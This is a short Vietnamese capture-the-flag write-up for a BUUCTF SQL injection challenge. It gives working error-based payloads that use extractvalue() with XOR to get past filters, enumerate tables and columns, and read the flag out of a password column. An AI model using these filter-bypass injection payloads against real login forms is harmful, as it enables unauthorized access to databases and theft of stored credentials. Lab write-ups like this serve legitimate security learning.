![image](https://github.com/Llam-a/BUUCTF/assets/115911041/96c61733-4748-4234-9d94-a804bd523724)

Ban đầu, mình có thử các payload cơ bản union, order by nhưng hầu hết đã bị filter hết.Sau khi thử extracvalue() với toán tử XOR thì thành công

Payload:

`username='^extractvalue(1,concat(0x7e,(select(database()))))%23&password=x`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/8ae8279c-ef36-42b7-9c2f-8a38107e7ad7)

Có table name r tìm column và data thôi.

Payload:

`/check.php?username='^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23&password=x`
 
 
`/check.php?username='^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23&password=x`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/be362d52-8779-444b-8d2d-57f71c63ec51)

Flag nằm ở cột password

Payload:

`/check.php?username='^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23&password=x`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/7ea88f39-e169-417f-9616-3415e9fd0f41)

Nhưng nó vẫn chưa ra hết flag, ta dùng hàm right để tìm phần sau

Payload:

`	/check.php?username='^extractvalue(1,concat(0x7e,(select(right(password,31))from(geek.H4rDsq1))))%23&password=x`

![image](https://github.com/Llam-a/BUUCTF/assets/115911041/ea741871-605e-4915-872a-b01a047e5a3a)

